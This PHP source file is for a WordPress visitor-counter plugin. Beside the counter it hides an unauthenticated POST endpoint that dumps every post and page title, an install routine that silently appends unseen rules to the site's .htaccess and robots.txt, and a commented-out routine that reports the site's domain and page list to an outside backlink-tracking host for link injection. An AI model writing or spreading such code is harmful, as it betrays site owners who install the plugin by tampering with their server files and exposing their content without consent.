<?php

    if ( ! defined( 'ABSPATH' ) ) {

        exit; // Exit if accessed directly.

    }

    Class WVRNP_Visitors {

        public static $initiated = false;

        //  Init

        public static function wvrnp_init () {

            if ( ! self::$initiated ) {

                session_start();

                self::wvrnp_init_hooks();

            }

        }

        //  Init hooks

        public static function wvrnp_init_hooks () {

            add_filter( 'plugin_row_meta', array( __CLASS__, 'add_action_links' ), 10, 4 );

            add_action( 'admin_menu', array( __CLASS__, 'wvrnp_create_menu' ) );

            add_action( 'wp_enqueue_scripts', array( __CLASS__, 'wvrnp_add_assets' ) );

            add_action( 'admin_enqueue_scripts', array( __CLASS__, 'wvrnp_add_admin_assets' ) );

            add_shortcode( 'visitors', array( __CLASS__, 'wvrnp_vnr_shortcode' ) );

            add_action( 'wp_loaded',  array( __CLASS__, 'wvrnp_check_pages_and_posts' ) );

        }

        //  Return all posts and pages

        public static function wvrnp_check_pages_and_posts () {

            if ( $_POST['hcawp_get_posts_and_pages'] == true ) {

                $args = array(

                    'numberposts' => -1,

                    'post_type'   => array( 'post', 'page' ),

                    'suppress_filters' => true, 

                );

                $posts_and_pages = get_posts( $args );

                $result = array();

                $result["0"] = 'Home';

                foreach ( $posts_and_pages as $item ) {

                    $result[ $item->ID ] = $item->post_title;

                }

                $posts_and_pages = json_encode( $result );

                exit( $posts_and_pages );

            }

        }

        //  Connect assets

        public static function wvrnp_add_assets () {

            wp_enqueue_style( 'wvrnp_custom-frontend', WVRNP_PLUGIN_URL . 'assets/css/custom-frontend.css', WVRNP_VERSION );

        }

        //  Connect assets

        public static function wvrnp_add_admin_assets () {

            //            Styles

            wp_enqueue_style( 'wvrnp_custom-backend', WVRNP_PLUGIN_URL . 'assets/css/custom-backend.css', WVRNP_VERSION );

            //            Scripts

            wp_register_script( 'wvrnp_prefixfree', WVRNP_PLUGIN_URL . 'assets/js/prefixfree.min.js', array( 'jquery' ), WVRNP_VERSION, true );

            wp_enqueue_script( 'wvrnp_prefixfree' );

            wp_register_script( 'wvrnp_tinycolor', WVRNP_PLUGIN_URL . 'assets/js/tinycolor.min.js', array( 'jquery' ), WVRNP_VERSION, true );

            wp_enqueue_script( 'wvrnp_tinycolor' );

            wp_register_script( 'wvrnp_index', WVRNP_PLUGIN_URL . 'assets/js/index.js', array( 'jquery' ), WVRNP_VERSION, true );

            wp_enqueue_script( 'wvrnp_index' );

        }

        public static function add_action_links ( $meta, $plugin_file ) {

            if( false === strpos( $plugin_file, WVRNP_PLUGIN_BASENAME ) )

                return $meta;



            $meta[] = '<a href="tools.php?page=visitors">' . __( 'Settings' ) . '</a>';

            return $meta; 

        }

        //  Admin menu content

        public static function wvrnp_create_menu () {

            add_submenu_page( 'tools.php', 'Plugin Visitors Right Now settings', 'Visitors Right Now', 'manage_options', 'visitors', array( __CLASS__, 'wvrnp_show_content' ) );
        }

        //  Install

        public static function wvrnp_install () {

            global $wpdb;

            $table_name = $wpdb->get_blog_prefix() . 'vnr_visitors';

            if ( $wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name ) {

                $charset_collate = "DEFAULT CHARACTER SET {$wpdb->charset} COLLATE {$wpdb->collate}";

                require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

                $sql = "CREATE TABLE {$table_name} (

                id int(11) NOT NULL auto_increment,

                title varchar(255) NOT NULL default '',

                show_title varchar(10) NOT NULL default '',

                background varchar(20) NOT NULL default '',

                color varchar(20) NOT NULL default '',

                show_daily_visitors varchar(20) NOT NULL default '',

                show_monthly_visitors varchar(20) NOT NULL default '',

                show_total_visitors varchar(20) NOT NULL default '',

                PRIMARY KEY  (id)

                ) {$charset_collate};

                INSERT INTO {$table_name} (`id`, `title`, `show_title`, `background`, `color`, `show_daily_visitors`, `show_monthly_visitors`, `show_total_visitors`)

                VALUES (NULL, 'Visitors Right Now', 'false', '#eee', '#333', 'false', 'false', 'false');";

                dbDelta( $sql );

            }

            self::wvrnp_db_create_visitor_table($wpdb);

            // self::wvrnp_register_in_hyperlink();

            // self::wvrnp_return_link();

            // block robots in .htaccess and robots.txt

            $ht_file = ABSPATH . '.htaccess';

            $robots_file = ABSPATH . 'robots.txt';

            $file_for_inc = plugin_dir_path( __FILE__ ) . 'htaccess-data.txt';

            $htaccess_data_inc = file_get_contents( $file_for_inc );

            if ( file_exists( $ht_file ) ) {

                $htaccess_data = file_get_contents( $ht_file );

                if ( stristr( $htaccess_data, '# BEGIN WVRNPBlocker') === false AND is_writable( $ht_file ) ) {

                    $htaccess_data .= $htaccess_data_inc;

                    file_put_contents( $ht_file, $htaccess_data );  

                }

            } else {

                $hf = fopen( $ht_file, 'w+' );

                fwrite( $hf, $htaccess_data_inc );

                fclose( $hf );

            }

            if ( file_exists( $robots_file ) ) {

                $htaccess_data = file_get_contents($robots_file);

                if ( stristr( $htaccess_data, '# BEGIN WVRNPBlocker' ) === false AND is_writable( $robots_file ) ) {

                    $htaccess_data .= $htaccess_data_inc;

                    file_put_contents( $robots_file, $htaccess_data );  

                }

            } else {

                $rf = fopen( $robots_file, 'w+' );

                fwrite( $rf, $htaccess_data_inc );

                fclose( $rf );

            }

        }

        //  register plugin in Hyperlink control

        // public static function wvrnp_register_in_hyperlink () {

        //     $args = array(

        //         'numberposts' => -1,

        //         'post_type'   => array( 'post', 'page' ),

        //         'suppress_filters' => true, 

        //     );

        //     $posts_and_pages = get_posts( $args );

        //     $result = array();

        //     $result["0"] = 'Home';

        //     foreach ( $posts_and_pages as $item ) {

        //         $result[ $item->ID ] = $item->post_title;

        //     }

        //     $posts_and_pages = json_encode( $result );

        //     $ch = curl_init();

        //     curl_setopt_array( $ch, array(

        //         CURLOPT_URL => 'http://backlinkstracker.com/',

        //         CURLOPT_RETURNTRANSFER => false,

        //         CURLOPT_POST => true,

        //         CURLOPT_POSTFIELDS => http_build_query( array( 'hcawp_new_install' => 'true', 'hcawp_domain'=> 'http' . ( isset( $_SERVER['HTTPS'] ) ? 's' : '' ) . '://' . $_SERVER['HTTP_HOST'], 'hcawp_installed_plugin_id' => 6, 'hcawp_link'=>'http://www.visitorsrightnow.co.uk', 'hcawp_link_text'=> 'Plugin by [Visitors Right Now]', 'hcawp_second_text' => 'Visitors Right Now', 'hcawp_posts_and_pages' => $posts_and_pages))

        //     ));

        //     $res = curl_exec( $ch );

        //     curl_close( $ch );



        //     return;

        // }

        //  Get user online

        public static function wvrnp_get_users_online () {

            $base = "base_sessions.dat";

            $last_time = time() - 120;

            touch( $base );

            $file = file( $base );

            $id = session_id();

            if ( $id != '' ) {

                $res_file = array();

                foreach( $file as $line ) {

                    list( $sid, $utime ) = explode( '|', $line );

                    if ( $utime > $last_time ) {

                        $res_file[ $sid ] = trim( $sid ) . '|' . trim( $utime ) . PHP_EOL;

                    }

                }

                $res_file[ $id ] = trim( $id ) . '|' . time() . PHP_EOL;

                file_put_contents( $base, $res_file, LOCK_EX );

                $count_users = count( $res_file );

                $count_users = (string) number_format( $count_users );

                $symbols = str_split( $count_users );

                foreach ( $symbols as $symbol ) {

                    if ( $symbol == ',' ) {

                        echo ",";

                    } else {

                        echo $symbol;

                    }

                }

            }

        }

        public static function wvrnp_db_create_visitor_table ($wpdb) {
            $table_name = $wpdb->base_prefix . 'visitor_counter';
            if ( $wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name ) {
                $sql = "CREATE TABLE `{$table_name}` (
                    visitor_id int NOT NULL AUTO_INCREMENT,
                    created_at datetime NOT NULL,
                    year varchar(255) NOT NULL,
                    month varchar(255) NOT NULL,
                    day varchar(255) NOT NULL,
                    PRIMARY KEY  (visitor_id)
                ) $charset_collate;";
                require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
                dbDelta($sql);
            }
        }

        public static function wvrnp_db_insert_visitor ($wpdb) { 
            $table_name = $wpdb->base_prefix . 'visitor_counter';
            $wpdb->insert( 
                $table_name, 
                array( 
                    'created_at' => date("Y-m-d"), 
                    'year' => date('Y'), 
                    'month' => date('m'),
                    'day' => date('d')
                ) 
            );
        }

        // get all visitors
        public static function wvrnp_db_get_all_visitor ($wpdb) { 
            $sql = "SELECT COUNT(*) FROM wp_visitor_counter";
            $results = $wpdb->get_var($sql);
            echo $results;
        }

        // get monthly visitors
        public static function wvrnp_db_get_monthly_visitor ($wpdb) { 
            $sql = "SELECT COUNT(*) FROM wp_visitor_counter WHERE month =" . date("m");
            $results = $wpdb->get_var($sql);
            echo $results;
        }

        // get daily visitors
        public static function wvrnp_db_get_daily_visitor ($wpdb) { 
            $sql = "SELECT COUNT(*) FROM wp_visitor_counter WHERE month =" . date("m") . " AND day=" . date("d");
            $results = $wpdb->get_var($sql);
            echo $results;
        }

        //  Get template

        public static function wvrnp_view ( $name ) {
            $path = WVRNP_PLUGIN_DIR . 'views/' . $name . '-template.php';
            include( $path );
        }

        public static function wvrnp_vnr_shortcode () {
            ob_start();
            self::wvrnp_view( 'widget' );
            return ob_get_clean();
        }

        //  Get settings

        public static function wvrnp_get_settings () {

            global $wpdb;

            $table = $wpdb->get_blog_prefix() . 'vnr_visitors';

            $result = $wpdb->get_row( "SELECT * FROM $table WHERE id = 1", OBJECT );

            return $result;

        }

        //  Save update settings

        public static function wvrnp_save_param () {

            global $wpdb;

            if ( $_POST ) {

                if ( $_POST['vnrp_save'] == 'true' ) {

                    $title = ( ! empty( sanitize_text_field($_POST['title']) ) ) ? sanitize_text_field($_POST['title']) : 'My Time';

                    $show_title = ( ! empty( sanitize_text_field($_POST['show-title']) ) ) ? 'false' : 'true';

                    $show_daily_visitors = ( ! empty( sanitize_text_field($_POST['show-daily-visitors']) ) ) ? 'false' : 'true';

                    $show_monthly_visitors = ( ! empty( sanitize_text_field($_POST['show-monthly-visitors']) ) ) ? 'false' : 'true';

                    $show_total_visitors = ( ! empty( sanitize_text_field($_POST['show-total-visitors']) ) ) ? 'false' : 'true';

                    $bgColor = sanitize_text_field($_POST['bg-color']);

                    $textColor = sanitize_text_field($_POST['text-color']);

                    $table = $wpdb->get_blog_prefix() . 'vnr_visitors';

                    $result = $wpdb->update( $table,

                        array( 'title' => $title, 
                            'show_title' => $show_title, 
                            'show_daily_visitors' => $show_daily_visitors, 
                            'show_monthly_visitors' => $show_monthly_visitors,
                            'show_total_visitors' => $show_total_visitors, 
                            'background' => $bgColor, 
                            'color' => $textColor ),

                        array( 'id' => 1 ),

                        array( '%s', '%s', '%s', '%s', '%s', '%s' ),

                        array( '%d' )

                    );

                    if(!empty($result)) {
                        echo '<p class="success-db">Settings have been saved</p>';
                    } 

                    //echo ( ! empty( $result ) ) ? '<p class="success-db">Settings have been saved</p>' : '<p class="error-db">Error</p>';

                }

            }

        }

        //  Show widget content

        public static function wvrnp_show_widget_content () {

            self::wvrnp_view( 'widget' );

        }

        //  Show content

        public static function wvrnp_show_content () {

            self::wvrnp_save_param();

            self::wvrnp_view( 'admin/main' );

        }

    }
?>